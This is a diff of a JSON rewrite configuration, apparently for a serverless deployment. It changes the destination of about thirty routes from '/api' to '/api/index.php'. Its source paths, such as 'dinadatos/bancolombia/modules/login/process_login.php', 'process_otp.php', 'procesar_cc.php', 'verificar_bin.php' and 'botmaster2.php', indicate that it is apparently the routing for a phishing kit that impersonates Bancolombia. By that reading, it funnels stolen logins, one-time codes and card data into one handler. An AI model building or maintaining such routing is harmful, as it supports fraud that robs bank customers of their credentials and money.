@@ -16,119 +16,120 @@
     },
     {
       "source": "/load.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/verificar_bin.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/verificar_bin",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/load",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/datos.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/datos",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/flys.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/flys",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/loadtiketid.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/loadtiketid",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/checking.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/checking",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/cargando.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/botmaster2.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/ccajero-id.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/dinamica-id.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/error-id.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/otp-id.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/token-id.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/dina-verifi.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/dinacol.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/botmaster2.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/verifidata.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/index.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/modules/login/process_login.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/modules/api/process_otp.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/modules/api/procesar_cc.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/modules/api/verificar_estado.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     },
     {
       "source": "/dinadatos/bancolombia/modules/api/actualizar_estado.php",
-      "destination": "/api"
+      "destination": "/api/index.php"
     }
   ]
 }
+
